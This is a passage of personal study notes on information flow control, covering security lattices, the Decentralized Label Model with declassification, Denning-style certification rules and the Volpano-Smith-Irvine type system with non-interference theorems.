	- e.g.: $\text{Low} \sqcap \text{High} = \text{Low}$ (the minimum)

We write
- $x \rightsquigarrow y$ whenever there is a flow of information from $x$ to $y$
- $\underline{x}$ for the security label of $x$ e.g. $\underline{x} = \text{High}$

We can enforce this idea via language-based enforcement. (see below)

> [!Example]
> 
> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.25.27.png)
#### Lattice Formalization ⭐
> [!links]
> ↗ [Partial Order & Order Theory](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Partial%20Order%20&%20Order%20Theory.md)
> ↗ [Lattice (Order Theory)](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Lattice%20(Order%20Theory)/Lattice%20(Order%20Theory).md)
> 
> ↗ [Access Control (访问控制)](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/Access%20Control%20(访问控制).md)
> ↗ [Access Control Models](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/📌%20Access%20Control%20Models/Access%20Control%20Models.md)
> - ↗ [MAC (Mandatory Access Control)](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/📌%20Access%20Control%20Models/MAC%20(Mandatory%20Access%20Control)/MAC%20(Mandatory%20Access%20Control).md)
> - ↗ [LBAC (Lattice-Based Access Control)](../../../../../../⛈️%20Risk%20Management%20(In%20Cyberspace)/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/📌%20Access%20Control%20Models/LBAC%20(Lattice-Based%20Access%20Control)/LBAC%20(Lattice-Based%20Access%20Control).md)

> [!Example] Confidentiality and Integrity in One Go?
> (Continuing from examples in "Volpano-Smith-Irvine")
> 
> ![|300](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)
> 
> Question: How can we become more general?
> Answer: Security Policy Frameworks for Mandatory Access Control.

A **security policy framework** is a 4-tuple $(S, \sqsubseteq, \sqcup, \sqcap)$ where
* $S$ is a **finite** and **non-empty** set of **security labels**.
* $\sqsubseteq: S \times S$ is a **binary relation**
	* (a) $\sqsubseteq$ is **reflexive** : for all $s \in S : s \sqsubseteq s$
	* (b) $\sqsubseteq$ is **transitive**: for all $s_1, s_2, s_3 \in S :$ 
		* $s_1 \sqsubseteq s_2 \land s_2 \sqsubseteq s_3 \implies s_1 \sqsubseteq s_3$
	* (c) $\sqsubseteq$ is **anti-symmetric**: for all $s_1, s_2 \in S:$
		* $s_1 \sqsubseteq s_2 \land s_1 \sqsupseteq s_2 \implies s_1 = s_2$
* $\sqcup: S \times S \to S$ and $\sqcap: S \times S \to S$ are two operations for **combining labels** such that
	*  for all $s_1, s_2 \in S$:
		* $s_1 \sqsubseteq s_1 \sqcup s_2 \text{ and } s_2 \sqsubseteq s_1 \sqcup s_2$
		* $s_1 \sqcap s_2 \sqsubseteq s_1 \text{ and } s_1 \sqcap s_2 \sqsubseteq s_2$
	* (This condition is basically saying: the Poset $(S, \sqsubseteq)$ is a lattice. Recall the definition of ↗ [Lattice (Order Theory)](../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Lattice%20(Order%20Theory)/Lattice%20(Order%20Theory).md))

> [!Example] Confidentiality and Integrity in One Go
> 
> Since $(S, \sqsubseteq)$ is a *lattice*, it allows to depict it nicely by just denoting the direct successors of security classes:
>
> ![|300](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)

In a security framework $(S, \sqsubseteq, \sqcup, \sqcap)$
* there is the bottom security label $\perp$ that can be obtained as $s_1 \sqcap s_2 \dots \sqcap s_n$ (if $S = \{s_1, \dots, s_n\}$).
* there is the top security label $\top$ that can be obtained as $s_1 \sqcup s_2 \dots \sqcup s_n$ (if $S = \{s_1, \dots, s_n\}$).

> [!Example]
> ![|400](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.59.20.png)
##### Typical Security Policy Frameworks - Components
Start with
- A finite and non-empty set $C$ of **security categories**.

Security labels can be all subsets of $C$:
- $(\mathrm{PowerSet}(C), \supseteq, \cap, \cup)$ for **confidentiality policies**.
- $(\mathrm{PowerSet}(C), \subseteq, \cup, \cap)$ for **integrity policies**.

A security label $s \in \mathrm{PowerSet}(C)$ is called a **component**.

Recall $\mathrm{PowerSet}(C) = \{\, C_0 \mid C_0 \subseteq C \,\},$ i.e., the set of subsets of $C$.

> [!Example]
> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.03.38.png)
> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.04.06.png)
##### Combining Security Policy Frameworks - Product Construction
Whenever $(S_1, \sqsubseteq_1, \sqcup_1, \sqcap_1)$ and $(S_2, \sqsubseteq_2, \sqcup_2, \sqcap_2)$ are two security frameworks, we can construct the framework $(S, \sqsubseteq, \sqcup, \sqcap)$ where
- $S = S_1 \times S_2$
- for $(s_{11}, s_{12}), (s_{21}, s_{22}) \in S$:
	- $(s_{11}, s_{12}) \sqsubseteq (s_{21}, s_{22}) \iff s_{11} \sqsubseteq_1 s_{21} \land s_{12} \sqsubseteq_2 s_{22}$
- for $(s_{11}, s_{12}), (s_{21}, s_{22}) \in S$:
	- $(s_{11}, s_{12}) \sqcup (s_{21}, s_{22}) = (s_{11} \sqcup_1 s_{21},\, s_{12} \sqcup_2 s_{22})$ and $(s_{11}, s_{12}) \sqcap (s_{21}, s_{22}) = (s_{11} \sqcap_1 s_{21},\, s_{12} \sqcap_2 s_{22})$

> [!Example]
> ![|300](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)
#### ✅ Non-Interference
> [!TIP] Theorem (Non-Interference for an arbitrary Security Policy Framework)
> * Suppose a program $c$ satisfies information flow policy $\gamma$:
> 	* $\gamma \vdash c : \tau \quad \text{(for any type } \tau, \text{ does not matter)}$
> * Suppose $\mu_1$ and $\mu_2$ are memories that are equal on all variables up to level $\tau_0$:
> 	* $\mu_1(x) = \mu_2(x) \text{ for every } x \text{ with } \gamma(x) \sqsubseteq \tau_0$
> * If we run the program on these memories:
>   * $\mu_1 \vdash c \Rightarrow \mu_1'$
>   * $\mu_2 \vdash c \Rightarrow \mu_2'$
>   (and they both terminate)
> * ... then the result will be the same on all variables up to level $\tau_0$:
> 	* $\mu_1'(x) = \mu_2'(x) \text{ for every } x \text{ with } \gamma(x) \sqsubseteq \tau_0$


### Decentralized Label Model (DLM) ⭐
> 📄 Myers, Andrew C., and Barbara Liskov. "A decentralized model for information flow control." _ACM SIGOPS Operating Systems Review_ 31.5 (1997): 129-142.

> [!Example] Introducing Example
> What label should match have?
> 
> ```
> pinfo = record [name,password:string{H}]
> 
> check_pw (db:array[pinfo]{H}, name:string{L}, password:string{H}) 
> 	returns ret:bool{L}
> 	
> 	i: int{L} :=0;
> 	match: bool{???} :=false;
> 	while (i<db.length) do
> 		if db[i].name=name && db[i].password=password
> 		then match:=true
> 		i:=i+1
> 	
> 	ret:=match
> ```
>
> ---
> What we cannot do with classical information flow (Dennings'): release some information that is depending on something classified.
> - Log in: the password data-base is secret, but the information whether you have entered the right password is not.
> - Result of an election: the votes are secret/private, but the result is public.
> - Medical database: the medical records are secret, but they may be released to a researcher after personal information is removed.
> - Electronic Auction: the max bids of customers is secret at first, but then during bidding they are partially revealed.
> We thus want a mechanism to explicitly **declassify** information in a **fine-grained** way.
> 
> ---
> Classical information flow gives you a strong guarantee:
> 
> > An intruder who can only observe the low variables, cannot learn anything about the high variables.
> 
> We have logically formalized this guarantee in the previous lecture: non-interference.
> 
> > Declassification means that you will lose this guarantee.
> 
> - Log in: an intruder can do a guessing attack
> - Result of an election: you learn a bit about the votes
> - Medical database: an intruder may be able to reconstruct some information about the patients.
> - Electronic Auction: an intruder learns a bit about the bids
> 
> ---
> If you give an intruder (dishonest person) some information, you lose all control over it. But the world is more complicated.
> 
> Consider a large organization like a hospital:
> - Even though the hospital itself is honest, it may run some systems that are not secure.
> - Systems that are designed by honest people could have bugs.
> - When declassifying information, you may not want to give permission to use the data **arbitrarily**.
> 	- There may be a usage policy about using the declassified data, and compliance may be required by law, e.g. GDPR.
> 	- Similarly, release of data may be subject to usage policy by a contract, e.g., the researchers must make a contract with the hospital to get access to patient data.
> - How to formally specify such policies and automatically prove compliance?

Andrew C. Myers and Barbara Liskov: _A Decentralized Model for Information Flow Control_, ACM Symposium on Operating System Principles, 1997 [1].
1. **Security lattice:** instead of high and low we have more complicated security labels:
    - A set of **owners**: participants or roles who own the respective data
    - An owner can say who can **read** the data.
    - You can only read data if **all** owners have allowed it.
2. Defining $⊑, ⊔, ⊓$.
	- Except for declassification this is standard information flow à la (in the manner of) Dennings' approach.
3. **Declassify** limited: an owner can only relax **their own constraint**.
4. Programs can act **on behalf** of an owner and thus declassify, but this forces programmer to make every declassification explicit, so one does not accidentally **forget** about the rights of some owner.

> [!example] Hospital Domain With DLM
> ![|400](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.37.23.png)

Overview
1. **Security lattice**:
	1. A set of **owners**: participants or roles who own the respective data
	2. An owner can say who can **read** the data.
	3. You can only read data if **all** owners have allowed it
2. Defining $\sqsubseteq$, $\sqcup$, $\sqcap$.
	1. Except for declassification this is standard information flow à la (in the manner of) Dennings' approach.
3. **Declassify**: an owner can relax their own constraint.
4. Programs can act **on behalf** of an owner and thus declassify.
#### Security Lattice
We have the security framework $(P \hookrightarrow \mathrm{PowerSet}(P), \sqsubseteq, \sqcup, \sqcap)$ where
- $P \hookrightarrow \mathrm{PowerSet}(P)$ is the set of all **partial mappings** from $P$ to $\mathrm{PowerSet}(P)$. 
	- $\begin{aligned} s_1 &= \{A : \{A,B\}\} \\ s_2 &= \{B : \{A\}\} \\ s_3 &= \{B : \{A\}, A : \{\}\} \end{aligned}$
- For a label $s$ we define $\mathrm{Owners}(s) = \mathrm{Domain}(s)$
- For a security label $s$ and principal $p$ define
	- $\mathrm{Readers}(s,p)= \begin{cases} s(p) & \text{if } p \in \mathrm{Owners}(s) \\ P & \text{if } p \notin \mathrm{Owners}(s) \end{cases}$
		- $Readers(s_1,A) = \{A,B\}$
		- $Readers(s_2,B) = \{A\}$
		- $Readers(s_3,B) = \{A\}$
		- $Readers(s_3,A) = \{ \}$
		- $Readers(s_3, C) = P$ (everybody)
- Alternative notation (bit easier to read): 
	- $\{(A : A,C),(B : B,C)\}$ for $\{A : \{A,C\}, B : \{B,C\}\}$
#### Ordering & Declassification Rule
##### Confidentiality
**Ordering**
For two security labels $s_1,s_2$ we have
- $s_1 \sqsubseteq s_2$ iff 
	- $\mathrm{Owners}(s_1) \subseteq \mathrm{Owners}(s_2)$ and
	- $\mathrm{Readers}(s_1,o) \supseteq \mathrm{Readers}(s_2,o) \quad \text{for every } o \in \mathrm{Owners}(s_1)$
- $s_1 \sqcup s_2$ such that
	- $\mathrm{Owners}(s_1 \sqcup s_2) = \mathrm{Owners}(s_1)\cup\mathrm{Owners}(s_2)$
	- $\mathrm{Readers}(s_1 \sqcup s_2,o) = \mathrm{Readers}(s_1,o) \cap \mathrm{Readers}(s_2,o)$ for every $o \in \mathrm{Owners}(s_1 \sqcup s_2)$
- $s_1 \sqcap s_2$ such that
	- $\mathrm{Owners}(s_1 \sqcap s_2) = \mathrm{Owners}(s_1)\cap\mathrm{Owners}(s_2)$
	- $\mathrm{Readers}(s_1 \sqcap s_2,o) = \mathrm{Readers}(s_1,o) \cup \mathrm{Readers}(s_2,o)$ for every owner $o \in \mathrm{Owners}(s_1 \sqcap s_2)$

Examples
- $\{(A : A,B)\} \sqsubseteq \{(A : A),(B : A,B)\}$
- $\{(A : A,B),(C : A,C)\} \sqcup \{(A : A,C),(B : A,B)\} = \{(A : A),(B : A,B),(C : A,C)\}$
- Write $\{\bot\}$ for the bottom element ($\sqcap$ of all labels), which is: no owners, everybody can read!


---
**Label Interpretation**

Useful definition that gives an intuitive explanation to our labels:

In the case of data with a **confidentiality** label $s$ $$\mathrm{EffectiveReaders}(s) = \bigcap_{o \in \mathrm{Owners}(s)}
\mathrm{Readers}(s,o)$$
Only principals in the effective readers set can read the data.

Example: $\mathrm{EffectiveReaders}(\{(B : A,B),(A : A)\}) = \{A\}$
Special case: for the bottom element $\{\bot\}$ (no owners), everybody $(P)$ is allowed to read: $$\mathrm{EffectiveReaders}(\{\bot\}) = P$$

---
**Declassification**
An owner $o$ can declassify their data **only** in the following ways:
- add readers for owner $o$
- or remove the owner $o$

> [!Example]
> $L_1 = \{(A : A,B),(B : B,C,D),(C : A,B,C)\}$ 
> Effective readers: $\{B\}$
> Owner $A$ can
> - Add readers, e.g., $L_2 = \{(A : A,B,C,D),(B : B,C,D),(C : A,B,C)\}$
> 	- This makes $C$ an effective reader, but not $D$ because $C$ does not support that.
> - Remove itself as owner: $L_3 = \{(B : B,C,D),(C : A,B,C)\}$, thus making $C$ an effective reader by removing the $A$'s constraint that only $A$ and $B$ can read.
> 	- Removing yourself is equivalent to adding everybody as a reader.
##### Integrity
Like the other information flow approaches, also Myers’ can be used for integrity with the following security labels:
- Instead of Readers we have Writers
- $s_1 \sqsubseteq s_2$ iff
	- $\mathrm{Owners}(s_1) \supseteq \mathrm{Owners}(s_2)$ and
	- $\forall o \in \mathrm{Owners}(s_2): \mathrm{Writers}(s_1,o) \subseteq \mathrm{Writers}(s_2,o)$
- $s_1 \sqcup s_2$ such that
	- $\mathrm{Owners}(s_1 \sqcup s_2) = \mathrm{Owners}(s_1)\cap\mathrm{Owners}(s_2)$
	- $\mathrm{Writers}(s_1 \sqcup s_2) = \mathrm{Writers}(s_1,o) \cup \mathrm{Writers}(s_2,o)$
- $s_1 \sqcap s_2$ such that
	- $\mathrm{Owners}(s_1 \sqcap s_2) = \mathrm{Owners}(s_1)\cup\mathrm{Owners}(s_2)$
	- $\mathrm{Writers}(s_1 \sqcap s_2) = \mathrm{Writers}(s_1,o) \cap \mathrm{Writers}(s_2,o)$
#### The Act as Relation
Declassification is only allowed to an entity who has the right to declassify.
- We can define for each process that it can act on behalf of principals, e.g., “process $X$ can act on behalf of hospital and patient $P$”
- Think of this as a form of delegation, e.g., a patient gives the hospital the authority to use some data for some purposes.
- By default, all processes run without any authority.
- The special construct $\texttt{if\_acts\_for}(X,Y)\ \texttt{then}\ Z$
	- checks if the current process $X$ is allowed to assume authority $Y$ 
	- and if so, executes command $Z$ with that authority.
- Declassification can only happen in the $Z$ block of an $\texttt{if\_acts\_for}$.
#### ✅ Declassification
> [!Example] 
> 
> ```
> pinfo = record [name,password:string{chkr:chkr}]
> check_pw(db:array[pinfo{⊥}]{⊥}, name:string{⊥}, password:string{client:chkr})
> 	returns ret:bool{client:chkr}
> 	
> 	i: int{chkr:chkr} :=0;
> 	match: bool{client:chkr,chkr:chkr} :=false;
> 	while (i<db.length) do
> 		if db[i].name=name && db[i].password=password
> 		then match:=true
> 		i:=i+1
> 	
> 	ret:=false
> 	if_acts_for(check_pw,chkr) then ret:=declassify(match,{client:chkr})
> ```
> 
> - chkr: special authority that owns the password database.
> - The check pw tries to assume the chkr authority, and, if successful, declassifies match.

> [!Abstract] Why not...
> Observation
> - The effective readers are the ones allowed to read
>   by every owner.
> - If $s_1 \sqsubseteq s_2$ then always
> 	- $\mathrm{EffectiveReaders}(s_1) \supseteq \mathrm{EffectiveReaders}(s_2)$
> 	- so information can only legally flow from an $s_1$-variable into an $s_2$-variable, if $s_2$ is at least as restrictive on the $\mathrm{EffectiveReaders}$.
> 
> > [!Question]
> > So why not simplify the labels to just the effective readers, i.e., a single set of participants who are allowed to read?
> > 🤔
> > Imagine the following scenario:
> > - A hospital has some data that can only be read by the hospital. (Not directly patient data,
> >   but maybe derived from it)
> > - Some patients have agreed that their data can be used in medical studies (after some anonymization), others have not.
> > - Can the data be declassified for medical studies?
> 
> Because of declassification:
> - The labels keep track of who has a say on the data.
> - This avoids that we forget somebody’s confidentiality rights to data when declassifying.



## 🎯 IFC Enforcement Mechanisms (Syntactic / Operational)
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Information_flow_control

A mechanism for _information flow control_ is one that enforces information flow policies. Several methods to enforce information flow policies have been proposed. Run-time mechanisms that tag data with information flow labels have been employed at the [operating system](https://en.wikipedia.org/wiki/Operating_system "Operating system") level and at the [programming language](https://en.wikipedia.org/wiki/Programming_language "Programming language") level. Static program analyses have also been developed that ensure information flows within programs are in accordance with policies.

Both static and dynamic analysis for current programming languages have been developed. However, dynamic analysis techniques cannot observe all execution paths, and therefore cannot be both sound and precise. In order to guarantee noninterference, they either terminate executions that might release sensitive information or they ignore updates that might leak information.

A prominent way to enforce information flow policies in a program is through a [security type system](https://en.wikipedia.org/wiki/Security_type_system "Security type system"): that is, a type system that enforces security properties. In such a sound type system, if a program type-checks, it meets the flow policy and therefore contains no improper information flows.


### Static Enforcement
#### Language-Based IFC
> [!links]
> ↗ [Context-Free Languages (CFL) & Push-Down Automata (PDA)](../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/😶‍🌫️%20Theory%20of%20Computation/🍏%20Automata%20Theory%20and%20(Formal)%20Language%20Theory/Context-Free%20Languages%20(CFL)%20&%20Push-Down%20Automata%20(PDA).md)

A **language-based approach**:
- We define the syntax of a small programming language using a context-free grammar.
- For each grammar rule, we specify an information flow rule, i.e., what information flows this construct can induce.

Now information flow can be checked statically as part of an interpreter or compiler for the programming language:
1. Parse a given input program, obtaining an abstract syntax tree.
2. Optionally do type checking and the like.
3. Traverse the tree and apply the corresponding information flow rules at every node to obtain the information flows.
4. For every information flow $x \rightsquigarrow y$ check that the security labels allow this flow: $\underline{x} \sqsubseteq \underline{y}$
5. If none of these checks failed, we know that in no execution of the program any illegal information flows can occur and we can safely run it or produce output code.

> [!Example]
> 📄 Denning, Dorothy E., and Peter J. Denning. "Certification of programs for secure information flow." _Communications of the ACM_ 20.7 (1977): 504-513.
> 
> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.25.27.png)
##### Denning & Denning
> 📄 Denning, Dorothy E., and Peter J. Denning. "Certification of programs for secure information flow." _Communications of the ACM_ 20.7 (1977): 504-513.

> [!Example]
> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.26.37.png)


---
**Rules for Declarations**
Grammar
- $D ::= T\ C\ \text{var}$
- $T ::= \textbf{integer} \mid \textbf{integer file} \mid \ldots$
- $C ::= \text{Low} \mid \text{High}$


Rules

| $D$                | security class of var        |
| ------------------ | ---------------------------- |
| $T\ C\ \text{var}$ | $\underline{\text{var}} = C$ |

The rules generate the security classes for our variables, files, ...

---
**Rules for Expressions**
Grammar
- $E ::= \text{var} \mid n \mid E_1\ op_a\ E_2$
  where var is for variable names, $n$ for integer constants, and
  $op_a ::= + \mid - \mid * \mid \ldots$
- $B ::= \text{true} \mid \text{false} \mid E_1\ op_r\ E_2 \mid B_1\ op_b\ B_2$
  $op_r ::= > \mid < \mid = \mid \ldots \quad \text{and} \quad op_b ::= \land \mid \lor \mid \ldots$


Rules

| $E$ | security class of $E$ |
|---|---|
| $\text{var}$ | $\underline{E} = \underline{\text{var}}$ |
| $n$ | $\underline{E} = \text{Low}$ |
| $E_1\ op_a\ E_2$ | $\underline{E} = \underline{E_1} \sqcup \underline{E_2}$ |

| $B$ | security class of $B$ |
|---|---|
| $\text{true}$ | $\underline{B} = \text{Low}$ |
| $\text{false}$ | $\underline{B} = \text{Low}$ |
| $E_1\ op_r\ E_2$ | $\underline{B} = \underline{E_1} \sqcup \underline{E_2}$ |
| $B_1\ op_b\ B_2$ | $\underline{B} = \underline{B_1} \sqcup \underline{B_2}$ |

The rules generate the security classes of arithmetic and boolean expressions.

---
**Rules for Statements**
Grammar $$ \begin{aligned}
S ::= {} & \text{var} := E \\
\mid {} & \textbf{input}\ \text{var}_1\ \textbf{from}\ \text{var}_2 \\
\mid {} & \textbf{output}\ E\ \textbf{to}\ \text{var} \\
\mid {} & \textbf{if}\ B\ \textbf{then}\ S_1\ \textbf{else}\ S_2 \\
\mid {} & \textbf{while}\ B\ \textbf{do}\ S_0 \\
\mid {} & S_1 ; S_2
\end{aligned} $$
Rules

| $S$                                                         | security class of $S$                                    | constraint                                                      |
| ----------------------------------------------------------- | -------------------------------------------------------- | --------------------------------------------------------------- |
| $\text{var} := E$                                           | $\underline{S} = \underline{\text{var}}$                 | $\underline{E} \sqsubseteq \underline{\text{var}}$              |
| $\textbf{input}\ \text{var}_1\ \textbf{from}\ \text{var}_2$ | $\underline{S} = \underline{\text{var}_1}$               | $\underline{\text{var}_2} \sqsubseteq \underline{\text{var}_1}$ |
| $\textbf{output}\ E\ \textbf{to}\ \text{var}$               | $\underline{S} = \underline{\text{var}}$                 | $\underline{E} \sqsubseteq \underline{\text{var}}$              |
| $\textbf{if}\ B\ \textbf{then}\ S_1\ \textbf{else}\ S_2$    | $\underline{S} = \underline{S_1} \sqcap \underline{S_2}$ | $\underline{B} \sqsubseteq \underline{S}$                       |
| $\textbf{while}\ B\ \textbf{do}\ S_0$                       | $\underline{S} = \underline{S_0}$                        | $\underline{B} \sqsubseteq \underline{S}$                       |
| $S_1 ; S_2$                                                 | $\underline{S} = \underline{S_1} \sqcap \underline{S_2}$ |                                                                 |

The rules generate the security class of a statement and impose information flow constraints.

---
**Rules for arrays and procedures**
Grammar
$$
\begin{aligned}
D ::= {} & \ldots \mid \textbf{integer array}\ C\ A[n] \mid \ldots \\
         & \ldots \mid \textbf{proc}\ p(\textbf{in}\ T_1\ C_1\ \text{var}_{in},
         \textbf{out}\ T_2\ C_2\ \text{var}_{out})\ \textbf{is}\ S_{body} \\
E ::= {} & \ldots \mid A[E_1] \\
S ::= {} & \ldots \mid A[E_1] := E_2 \mid \textbf{call}\ p(E,\text{var})
\end{aligned}
$$


Rules

| $S$                              | security class of $S$           | constraint                                                                                                                     |
| -------------------------------- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| $A[E_1] := E_2$                  | $\underline{S} = \underline{A}$ | $\underline{E_1} \sqcup \underline{E_2} \sqsubseteq \underline{A}$                                                             |
| $\textbf{call}\ p(E,\text{var})$ | $\underline{S} = \underline{p}$ | $\underline{E} \sqsubseteq \underline{\text{var}_{in}}$ <br> $\underline{\text{var}_{out}} \sqsubseteq \underline{\text{var}}$ |

where $p$ was declared with as input $\text{var}_{in}$ and output $\text{var}_{out}$.
#### Type-System-Based IFC
> [!links]
> ↗ [Type Theory (类型论)](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/📍%20Formal%20System,%20Formal%20Logics,%20and%20Its%20Semantics/🪸%20Type%20Theory%20(类型论)/Type%20Theory%20(类型论).md)
> ↗ [Type Analysis](../../../../../../../../🔑%20CS%20Core/🧞‍♂️%20Programming%20Language%20Processing%20&%20Program%20Execution/🚮%20Program%20Language%20Processing%20&%20Compilation%20Theory%20(Compile-time)/Compilation%20Phase/1️⃣%20Frontend%20-%20Programming%20Language%20Analysis/Semantic%20Analysis/Type%20Analysis/Type%20Analysis.md)
> ↗ [Type and Effect Systems](../🦖%20Type%20and%20Effect%20Systems/Type%20and%20Effect%20Systems.md)

> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Security_type_system

In a programming language augmented with a security type system every expression carries both a type (such as boolean, or integer) and a security label.

Following is a simple security type system from [1] that enforces non-interference. The notation $\vdash exp : \tau$ means that the expression $exp$ has type $\tau$. Similarly, $[sc] \vdash C$ means that the command $C$ is typable in the security context $sc$.
$$
\begin{aligned}

[E1\!-\!2]\quad 
&\frac{}{\vdash exp : high}
\qquad
\frac{h \notin Vars(exp)}{\vdash exp : low}
\\[10pt]

[C1\!-\!3]\quad 
&[sc] \vdash skip
\qquad
[sc] \vdash h := exp
\qquad
\frac{\vdash exp : low}{[low] \vdash l := exp}
\\[10pt]

[C4\!-\!5]\quad 
&\frac{[sc] \vdash C_1 \quad [sc] \vdash C_2}{[sc] \vdash C_1; C_2}
\qquad
\frac{\vdash exp : sc \quad [sc] \vdash C}{[sc] \vdash while\ exp\ do\ C}
\\[10pt]

[C6\!-\!7]\quad 
&\frac{\vdash exp : sc \quad [sc] \vdash C_1 \quad [sc] \vdash C_2}{[sc] \vdash if\ exp\ then\ C_1\ else\ C_2}
\qquad
\frac{[high] \vdash C}{[low] \vdash C}

\end{aligned}
$$

Well-typed commands include, for example,
$$
[low] \vdash if\ l = 42\ then\ h := 3\ else\ l := 0.
$$

Conversely, the program
$$
l := 0;\ while\ l < h\ do\ l := l + 1
$$

is ill-typed, as it will disclose the value of variable $h$ into $l$.

Note that the rule $[C7]$ is a subsumption rule, which means that any command that is of security type $high$ can also be $low$. For example, $h := 1$ can be both $high$ and $low$. This is called polymorphism in type theory. Similarly, the type of an expression $exp$ that satisfies $h \notin Vars(exp)$ can be both $high$ and $low$ according to $[E1]$ and $[E2]$ respectively.
##### Volpano-Smith-Irvine 🤔
> 📄 Volpano, Dennis, Cynthia Irvine, and Geoffrey Smith. "A sound type system for secure flow analysis." _Journal of computer security_ 4.2-3 (1996): 167-187.

Essentially the same approach as Denning and Denning:
- . . . but represented as a **type system**
	- Security classes like Low and High are considered as types
	- The ordering of security classes $⊑$ is considered as a **subtype relation**
	- Information Flow Analysis is described as a set of **type-inference rules**
- They give a natural semantics for the programming language.
- Type system and semantics allows for proving a precise statement about the security of programs that fulfill the information flow policy: a **Non-Interference Result**.

We simplify the paper a bit:
- Volpano et al. distinguish variables and memory locations, we treat them here all as variables (dropping the concept of introducing local variables).
- The corresponding symbol tables γ and λ are merged to just γ.
- We directly work with the syntax-directed form and do not need to distinguish the syntactic roles of variables, expressions and commands in the type system (i.e., we do not have var τ etc.)

###### Syntax

###### Semantics

###### ✅ Non-Interference

> [!TIP] Theorem (Non-Interference instantiated for $L \sqsubseteq H$-security)
> * Suppose a program $c$ satisfies information flow policy $\gamma$:
> 	* $\gamma \vdash c : \tau \quad \text{(for any type } \tau, \text{ does not matter)}$
> * Suppose $\mu_1$ and $\mu_2$ are memories that are equal on all **low** variables:
> 	* $\mu_1(x) = \mu_2(x) \text{ for every } x \text{ with } \gamma(x) = L$
> * If we run the program on these memories:
>   * $\mu_1 \vdash c \Rightarrow \mu_1'$
>   * $\mu_2 \vdash c \Rightarrow \mu_2'$
>   (and they both terminate)
> * ... then the result will be the same on all **low** variables:
> 	* $\mu_1'(x) = \mu_2'(x) \text{ for every } x \text{ with } \gamma(x) = L$
> 
> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.15.35.png)

> [!TIP] Theorem (Non-Interference instantiated for $T \sqsubseteq U$)
> * Suppose a program $c$ satisfies information flow policy $\gamma$:
> 	* $\gamma \vdash c : \tau \quad \text{(for any type } \tau, \text{ does not matter)}$
> * Suppose $\mu_1$ and $\mu_2$ are memories that are equal on all **trusted** variables:
> 	* $\mu_1(x) = \mu_2(x) \text{ for every } x \text{ with } \gamma(x) = T$
> * If we run the program on these memories:
>   * $\mu_1 \vdash c \Rightarrow \mu_1'$
>   * $\mu_2 \vdash c \Rightarrow \mu_2'$
>   (and they both terminate)
> * ... then the result will be the same on all **trusted** variables:
> 	* $\mu_1'(x) = \mu_2'(x) \text{ for every } x \text{ with } \gamma(x) = T$
> 
> Noninteference for Authentication / Integrity 
> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.16.16.png)

> [!Example] Confidentiality and Integrity in One Go?
> ( Referring to examples in "Formalized security policy framework")
> 
> ![|300](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)
> 
> Question: How can we become more general?
> Answer: Security Policy Frameworks for Mandatory Access Control.
##### Jif (DLM-based Type System)
> 📄 Myers, Andrew C., and Barbara Liskov. "A decentralized model for information flow control." _ACM SIGOPS Operating Systems Review_ 31.5 (1997): 129-142.
#### Analysis-Based IFC (Program Analysis Techniques)
↗ [Program Abstraction & Abstract Interpretation](../🛗%20Program%20Abstraction%20&%20Abstract%20Interpretation/Program%20Abstraction%20&%20Abstract%20Interpretation.md)
↗ [Data Flow Analysis](../Data%20Flow%20Analysis/Data%20Flow%20Analysis.md)
↗ [Taint Analysis](Taint%20Analysis/Taint%20Analysis.md)


### Dynamic Enforcement
#### Declassification Approaches for Implicit Flows
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows

An implicit flow occurs when code whose conditional execution is based on private information updates a public variable. This is especially problematic when multiple executions are considered since an attacker could leverage the public variable to infer private information by observing how its value changes over time or with the input.
##### The naïve approach
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows

